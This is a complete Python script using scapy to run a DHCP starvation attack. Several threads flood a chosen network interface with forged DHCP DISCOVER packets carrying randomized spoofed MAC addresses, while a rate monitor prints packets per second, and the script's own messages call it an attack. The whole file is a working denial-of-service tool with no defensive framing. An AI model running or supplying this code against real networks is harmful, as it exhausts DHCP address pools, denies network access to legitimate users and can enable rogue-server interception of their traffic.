#!/usr/bin/env python3
import threading
import time
import socket
import random
import struct
from argparse import ArgumentParser
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf, get_if_hwaddr

PACKET_POOL_SIZE = 256
used_mac_pool = []
packet_pool = []
exit_flag = threading.Event()
pps_counter = 0
pps_lock = threading.Lock()

def generate_random_mac():
    return "52:54:00:%02x:%02x:%02x" % (
        random.randint(0, 127),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def build_dhcp_discover(mac):
    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    xid = random.randint(0, 0xFFFFFFFF)
    bootp = BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10, xid=xid, flags=0x8000)
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    return ether / ip / udp / bootp / dhcp

def init_packet_pool():
    global packet_pool
    for _ in range(PACKET_POOL_SIZE):
        mac = generate_random_mac()
        used_mac_pool.append(mac)
        pkt = build_dhcp_discover(mac)
        packet_pool.append(pkt)

def sender(iface, thread_id):
    global pps_counter
    sock = conf.L2socket(iface=iface)
    index = thread_id % PACKET_POOL_SIZE

    while not exit_flag.is_set():
        pkt = packet_pool[index]

        # Refresh every N packets
        if random.random() < 0.1:
            mac = generate_random_mac()
            packet_pool[index] = build_dhcp_discover(mac)

        try:
            sock.send(packet_pool[index])
            with pps_lock:
                pps_counter += 1
        except Exception:
            continue

        index = (index + 1) % PACKET_POOL_SIZE

def pps_monitor():
    global pps_counter
    total = 0
    start = time.time()
    while not exit_flag.is_set():
        time.sleep(1)
        with pps_lock:
            pps = pps_counter
            pps_counter = 0
        total += pps
        elapsed = time.time() - start
        avg = total / elapsed if elapsed else 0
        print(f"[+] Rate: {pps} pkt/s | Total: {total} | Avg: {avg:.2f} pkt/s")

def main():
    parser = ArgumentParser()
    parser.add_argument("-i", "--interface", required=True, help="Interface (e.g., wlan0)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    args = parser.parse_args()

    print("[*] Initializing packet pool...")
    init_packet_pool()

    print(f"[*] Starting {args.threads} threads on {args.interface}")
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=sender, args=(args.interface, i))
        t.start()
        threads.append(t)

    monitor = threading.Thread(target=pps_monitor)
    monitor.start()

    try:
        input("🚀 Press Enter to stop the attack...\n")
    except KeyboardInterrupt:
        pass
    exit_flag.set()

    for t in threads:
        t.join()
    monitor.join()
    print("[*] Attack terminated.")

if __name__ == "__main__":
    main()